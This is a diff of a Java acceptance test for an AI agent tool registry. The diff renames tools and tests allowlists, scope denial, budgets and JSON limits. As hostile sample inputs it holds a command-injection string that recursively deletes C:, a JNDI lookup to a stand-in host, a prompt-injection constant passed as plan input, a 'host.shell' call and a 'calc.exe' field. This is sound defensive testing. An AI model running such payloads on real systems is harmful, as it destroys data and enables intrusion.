@@ -59,16 +59,16 @@ public final class AiToolRegistryAcceptanceTest {
     }
 
     private static void roleAllowlistsAreFixed(AiToolRegistry registry) {
-        check(names(registry, AgentRole.PRE_ANALYSIS).equals(Set.of("facts.search", "evidence.get")),
+        check(names(registry, AgentRole.PRE_ANALYSIS).equals(Set.of("facts_search", "evidence_get")),
                 "pre-analysis allowlist");
         check(names(registry, AgentRole.PATH_EXPLORATION)
-                        .equals(Set.of("facts.search", "evidence.get", "plan.propose")),
+                        .equals(Set.of("facts_search", "evidence_get", "plan_propose")),
                 "path-exploration allowlist");
         check(names(registry, AgentRole.VULNERABILITY_TRIAGE)
-                        .equals(Set.of("facts.search", "evidence.get", "plan.propose")),
+                        .equals(Set.of("facts_search", "evidence_get", "plan_propose")),
                 "vulnerability-triage allowlist");
         check(names(registry, AgentRole.REPORT_GENERATION)
-                        .equals(Set.of("facts.search", "evidence.get", "plan.propose")),
+                        .equals(Set.of("facts_search", "evidence_get", "plan_propose")),
                 "report-generation allowlist");
     }
 
@@ -77,7 +77,7 @@ public final class AiToolRegistryAcceptanceTest {
         arguments.put("entrypointRef", "evidence:entry-a");
         arguments.put("objective", INJECTION);
         arguments.putArray("candidateInputs").add("'; Remove-Item C:\\\\ -Recurse").add("${jndi:ldap://bad}");
-        ToolResult result = registry.execute(call("inject", "plan.propose", arguments),
+        ToolResult result = registry.execute(call("inject", "plan_propose", arguments),
                 context(AgentRole.PATH_EXPLORATION, 4, 16_384, 8, 16_384));
         check(result.status() == ToolStatus.SUCCESS, "prompt-like data is accepted as opaque plan input");
         JsonNode plan = result.outputs().get(0).value();
@@ -91,25 +91,25 @@ public final class AiToolRegistryAcceptanceTest {
         ObjectNode authority = JSON.createObjectNode();
         authority.put("kind", "METHOD");
         authority.put("approved", true);
-        check(registry.execute(call("authority", "facts.search", authority),
+        check(registry.execute(call("authority", "facts_search", authority),
                 context(AgentRole.PRE_ANALYSIS, 2, 4096, 8, 4096)).status() == ToolStatus.DENIED,
                 "model-controlled authority is denied");
 
         ObjectNode crossProject = JSON.createObjectNode();
         crossProject.put("evidenceRef", "evidence:entry-a");
         crossProject.put("projectId", "project-b");
-        check(registry.execute(call("cross-argument", "evidence.get", crossProject),
+        check(registry.execute(call("cross-argument", "evidence_get", crossProject),
                 context(AgentRole.PRE_ANALYSIS, 2, 4096, 8, 4096)).status() == ToolStatus.DENIED,
                 "model-controlled project scope is denied");
 
         source.returnWrongScope = true;
-        check(registry.execute(call("cross-source", "facts.search",
+        check(registry.execute(call("cross-source", "facts_search",
                         object("kind", "METHOD")), context(AgentRole.PRE_ANALYSIS, 2, 4096, 8, 4096))
                         .status() == ToolStatus.DENIED,
                 "cross-project data source result is denied");
         source.returnWrongScope = false;
 
-        check(registry.execute(call("role-denied", "plan.propose",
+        check(registry.execute(call("role-denied", "plan_propose",
                         planArguments()), context(AgentRole.PRE_ANALYSIS, 2, 4096, 8, 4096))
                         .status() == ToolStatus.DENIED,
                 "role cannot invoke a tool outside its fixed allowlist");
@@ -117,9 +117,9 @@ public final class AiToolRegistryAcceptanceTest {
 
     private static void budgetsAndUnknownToolsFailClosed(AiToolRegistry registry) {
         ToolExecutionContext oneCall = context(AgentRole.PRE_ANALYSIS, 1, 4096, 8, 4096);
-        check(registry.execute(call("first", "facts.search", object("kind", "METHOD")), oneCall)
+        check(registry.execute(call("first", "facts_search", object("kind", "METHOD")), oneCall)
                 .status() == ToolStatus.SUCCESS, "first budgeted call succeeds");
-        check(registry.execute(call("second", "facts.search", object("kind", "METHOD")), oneCall)
+        check(registry.execute(call("second", "facts_search", object("kind", "METHOD")), oneCall)
                 .status() == ToolStatus.NOT_EXECUTED, "exhausted call budget is not executed");
         check(registry.execute(call("unknown", "host.shell", JSON.createObjectNode()),
                 context(AgentRole.PRE_ANALYSIS, 1, 4096, 8, 4096)).status() == ToolStatus.NOT_FOUND,
@@ -128,7 +128,7 @@ public final class AiToolRegistryAcceptanceTest {
         ToolExecutionContext deniedCallBudget = context(AgentRole.PRE_ANALYSIS, 1, 4096, 8, 4096);
         check(registry.execute(call("unknown-budget", "host.shell", JSON.createObjectNode()),
                 deniedCallBudget).status() == ToolStatus.NOT_FOUND, "unknown call is rejected");
-        check(registry.execute(call("after-unknown", "facts.search", object("kind", "METHOD")),
+        check(registry.execute(call("after-unknown", "facts_search", object("kind", "METHOD")),
                 deniedCallBudget).status() == ToolStatus.NOT_EXECUTED,
                 "rejected model calls still consume the fixed call budget");
     }
@@ -136,34 +136,34 @@ public final class AiToolRegistryAcceptanceTest {
     private static void jsonBoundsAndSchemasAreEnforced(AiToolRegistry registry) {
         ObjectNode oversized = object("kind", "METHOD");
         oversized.put("query", "x".repeat(512));
-        check(registry.execute(call("large", "facts.search", oversized),
+        check(registry.execute(call("large", "facts_search", oversized),
                 context(AgentRole.PRE_ANALYSIS, 1, 80, 8, 4096))
                 .status() == ToolStatus.INVALID_ARGUMENTS, "oversized JSON is rejected");
 
         ObjectNode deep = object("kind", "METHOD");
         ObjectNode cursor = deep.putObject("opaque");
         for (int i = 0; i < 8; i++) cursor = cursor.putObject("nested");
-        check(registry.execute(call("deep", "facts.search", deep),
+        check(registry.execute(call("deep", "facts_search", deep),
                 context(AgentRole.PRE_ANALYSIS, 1, 4096, 5, 4096))
                 .status() == ToolStatus.INVALID_ARGUMENTS, "over-deep JSON is rejected");
 
         ObjectNode unknownArgument = object("kind", "METHOD");
         unknownArgument.put("command", "calc.exe");
-        check(registry.execute(call("schema", "facts.search", unknownArgument),
+        check(registry.execute(call("schema", "facts_search", unknownArgument),
                 context(AgentRole.PRE_ANALYSIS, 1, 4096, 8, 4096))
                 .status() == ToolStatus.INVALID_ARGUMENTS, "unknown schema field is rejected");
     }
 
     private static void resultOverflowIsTruncatedOrDenied(AiToolRegistry registry, FakeSource source) {
         source.manyFacts = true;
-        ToolResult truncated = registry.execute(call("truncate", "facts.search", object("kind", "METHOD")),
+        ToolResult truncated = registry.execute(call("truncate", "facts_search", object("kind", "METHOD")),
                 context(AgentRole.PRE_ANALYSIS, 1, 4096, 8, 700));
         check(truncated.status() == ToolStatus.SUCCESS && truncated.truncated(),
                 "fact search result is explicitly truncated");
         check(truncated.outputs().size() < 20, "truncation limits output count");
         source.manyFacts = false;
 
-        ToolResult denied = registry.execute(call("deny-large", "evidence.get",
+        ToolResult denied = registry.execute(call("deny-large", "evidence_get",
                         object("evidenceRef", "evidence:large")),
                 context(AgentRole.PRE_ANALYSIS, 1, 4096, 8, 700));
         check(denied.status() == ToolStatus.NOT_EXECUTED
@@ -179,12 +179,12 @@ public final class AiToolRegistryAcceptanceTest {
 
         ToolExecutionContext cancelled = context(AgentRole.PRE_ANALYSIS, 1, 4096, 8, 4096);
         cancelled.cancel();
-        check(registry.execute(call("cancelled", "facts.search", object("kind", "METHOD")), cancelled)
+        check(registry.execute(call("cancelled", "facts_search", object("kind", "METHOD")), cancelled)
                 .status() == ToolStatus.CANCELLED, "cancelled job");
         ToolExecutionContext expired = ToolExecutionContext.bind(SCOPE, "principal-a", "job-a",
                 AgentRole.PRE_ANALYSIS, new ToolExecutionContext.Budget(
                         1, 4096, 8, 4096, Instant.now().minus(1, ChronoUnit.SECONDS)));
-        check(registry.execute(call("expired", "facts.search", object("kind", "METHOD")), expired)
+        check(registry.execute(call("expired", "facts_search", object("kind", "METHOD")), expired)
                 .status() == ToolStatus.TIMEOUT, "expired deadline");
     }
 
